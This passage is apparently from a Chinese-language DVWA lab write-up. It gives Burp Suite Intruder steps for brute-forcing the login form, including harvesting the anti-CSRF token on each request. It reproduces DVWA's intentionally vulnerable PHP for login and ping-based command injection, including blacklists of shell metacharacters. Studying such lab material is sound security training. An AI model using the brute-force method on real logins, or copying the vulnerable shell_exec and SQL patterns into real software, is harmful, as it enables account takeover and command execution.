alt="image-20210425163429574"></p></li><li><p>Send to intruder</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163500449.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163500449"></p></li><li><p>选择密码位置</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163605602.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163605602"></p></li><li><p>上字典</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425164245642.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425164245642"></p></li><li><p>根据返回长度判断正确密码</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425171021802.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425171021802"></p></li></ul><h3 id="medium"><a class="markdownIt-Anchor" href="#medium">#</a> Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>加入了参数的判断，防止部分 SQL 注入，加入 sleep (2)</li><li>没有防爆破机制，操作同 Low 等级</li></ul><h3 id="high"><a class="markdownIt-Anchor" href="#high">#</a> High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>加入 Anti-CSRF token 机制，验证本次请求中是否包含上一个回应中的 token</p></li><li><p>抓包分析</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174153220.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174153220"></p></li><li><p>Send to intruder，选择 position，两个爆破位应使用 Pitchfork 模式</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174257108.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174257108"></p></li><li><p>option 中选择 Grep-Extract，添加回应包中的 token 值</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174734492.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174734492"></p></li><li><p>第一个位置应用字典，第二个位置应用 grep 内容，并初始化 token 值</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175021711.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175021711"></p><ul><li>Start attack，一样看长度</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175428340.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175428340"></p><hr><h2 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection">#</a> Command Injection</h2><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175815201.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175815201"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#Command Injection</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Impossible Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#High Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Medium Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Low Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-2"><a class="markdownIt-Anchor" href="#low-2">#</a> 